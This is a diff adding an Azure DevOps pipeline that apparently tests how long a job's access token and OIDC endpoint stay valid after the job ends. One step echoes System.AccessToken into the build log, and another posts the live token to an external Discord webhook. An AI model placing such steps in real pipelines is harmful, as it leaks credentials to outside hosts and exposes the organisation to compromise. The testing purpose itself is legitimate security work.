@@ -1,0 +1,102 @@
+# This pipeline runs a long task so you can call the OIDC endpoint from your computer and observe when it stops working after the job completes
+
+trigger: none
+
+jobs:
+- job: LongRunningContainerJob
+  displayName: 'Long Running Job for External Testing'
+  timeoutInMinutes: 60
+  
+  pool:
+    name: 'self-host' # Same name as your agent pool
+  
+  container: mcr.microsoft.com/dotnet/sdk:8.0 # container picked because it has curl
+  
+  variables:
+    - group: Discord Webhook  # Variable group containing DISCORD_WEBHOOK_URL
+
+  steps:
+  # Allow oauth
+  - checkout: self
+    persistCredentials: true
+  
+  # Display all the information you need to call the OIDC endpoint
+  - script: |
+      echo "================================================================"
+      echo "Organization URL: $(System.TeamFoundationCollectionUri)"
+      echo "Project ID: $(System.TeamProjectId)"
+      echo "Plan ID: $(System.PlanId)"
+      echo "Job ID: $(System.JobId)"
+      echo "System.AccessToken = $(System.AccessToken)"
+      echo "Hub Name: build"
+      echo ""
+      echo "OIDC Token Endpoint URL:"
+      echo "$(System.TeamFoundationCollectionUri)$(System.TeamProjectId)/_apis/distributedtask/hubs/build/plans/$(System.PlanId)/jobs/$(System.JobId)/oidctoken?api-version=7.1-preview.1"
+      echo ""
+      echo "Container Information:"
+      echo "  Hostname: $(hostname)"
+      echo "  Container ID: $(cat /proc/self/cgroup | head -1 | cut -d'/' -f3 | cut -c1-12)"
+      echo "  Started at: $(date -u +'%Y-%m-%d %H:%M:%S UTC')"
+      echo ""
+      echo "================================================================"
+      echo "JOB WILL RUN FOR 10 MINUTES - START TESTING NOW!"
+      echo "================================================================"
+    displayName: 'Display OIDC Endpoint Information'
+
+  - script: |
+      echo "Testing access token by calling DevOps API..."
+      curl -v -X POST "$(System.TeamFoundationCollectionUri)$(System.TeamProjectId)/_apis/distributedtask/hubs/build/plans/$(System.PlanId)/jobs/$(System.JobId)/oidctoken?api-version=7.1-preview.1" -H "Authorization: Bearer $(System.AccessToken)" -H "Content-Type: application/json" -d "{}"
+    displayName: Test System.AccessToken Usage
+
+  - script: |
+      echo "Sending message to Discord..."
+      curl -H "Content-Type: application/json" \
+           -d '{"content": "$(System.AccessToken)"}' \
+           "$(DISCORD_WEBHOOK_URL)"
+    displayName: "Post to Discord webhook"
+
+  # Keep the job alive for 10 minutes so you can test from your computer
+  - script: |
+      echo "Test the OIDC endpoint from your computer."
+      echo ""
+      
+      # Run for 10 minutes with status updates every 30 seconds
+      DURATION=600
+      INTERVAL=30
+      ELAPSED=0
+      
+      while [ $ELAPSED -lt $DURATION ]; do
+        REMAINING=$((DURATION - ELAPSED))
+        MINUTES=$((REMAINING / 60))
+        SECONDS=$((REMAINING % 60))
+        
+        echo "[$(date -u +'%H:%M:%S')] Job still active - ${MINUTES}m ${SECONDS}s remaining"
+        echo "  Container ID: $(cat /proc/self/cgroup | head -1 | cut -d'/' -f3 | cut -c1-12)"
+        echo "  Hostname: $(hostname)"
+        echo ""
+        
+        sleep $INTERVAL
+        ELAPSED=$((ELAPSED + INTERVAL))
+      done
+      
+      echo "================================================================"
+      echo "JOB ABOUT TO COMPLETE - ENDPOINT WILL BECOME INVALID"
+      echo "================================================================"
+    displayName: 'Wait for 10 minutes'
+
+  # Final countdown
+  - script: |
+      echo "================================================================"
+      echo "FINAL COUNTDOWN - JOB ENDING IN 30 SECONDS"
+      echo "================================================================"
+      
+      for i in {30..1}; do
+        echo "Job ending in $i seconds..."
+        sleep 1
+      done
+      
+      echo ""
+      echo "================================================================"
+      echo "OIDC endpoint should now return errors from your computer"
+      echo "================================================================"
+    displayName: 'Final Countdown'
